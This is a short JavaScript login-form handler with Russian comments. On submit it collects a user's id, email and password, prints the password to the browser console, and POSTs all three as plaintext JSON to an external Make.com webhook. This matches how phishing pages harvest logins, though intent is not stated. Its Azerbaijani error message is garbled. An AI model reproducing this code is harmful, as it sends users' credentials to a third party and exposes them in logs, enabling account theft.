let form = document.getElementById('loginForm');

form.addEventListener('submit', (event) => {
    event.preventDefault();

    // Получаем значения из формы
    let userId = document.getElementById('id').value;
    let userEmail = document.getElementById('email').value;
    let userPassword = document.getElementById('password').value;

    // Проверяем данные (при необходимости)
    if (!userEmail || !userPassword) {
        alert('Пожалуйста, заполните все поля.');
        return;
    }

    // Создаем объект с данными
    let data = {
        id: userId,
        email: userEmail,
        password: userPassword
    };

    // Используем значение
    console.log("Значение input:", userId);
    console.log("Значение input:", userEmail);
    console.log("Значение input:", userPassword);

    fetch('https://hook.eu2.make.com/h5wei8h57yaet9f693hx1hjlpysisffq', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            return response.text()
                .then(text => {
                    throw new Error(`Ошибка при отправке данных: ${response.status} - ${text}`);
                });
        }
        // Обработка успешного ответа
        console.log('Данные успешно отправлены');
    })
    .catch(error => {
        console.error('Ошибка:', error);
        alert('Bir səhv baş verdiçzhemet olmasa yene yoxlayin!', error.message);
    });
});
